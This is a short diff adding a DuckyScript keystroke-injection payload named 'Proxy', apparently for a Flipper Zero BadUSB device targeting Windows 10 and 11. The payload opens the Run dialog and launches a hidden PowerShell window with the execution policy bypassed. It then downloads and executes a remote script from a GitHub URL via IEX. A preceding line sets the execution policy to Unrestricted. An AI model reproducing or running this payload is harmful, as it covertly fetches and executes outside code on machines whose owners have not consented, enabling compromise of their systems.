@@ -1,0 +1,14 @@
+powershell C:\Users\michael\Downloads\Sand.ps1 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Verbose
+
+REM     Title: Proxy
+
+REM     Author: Polar
+
+REM     Description: 
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -Command "& { IEX (Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/Proxy.ps1).Content }"
+ENTER
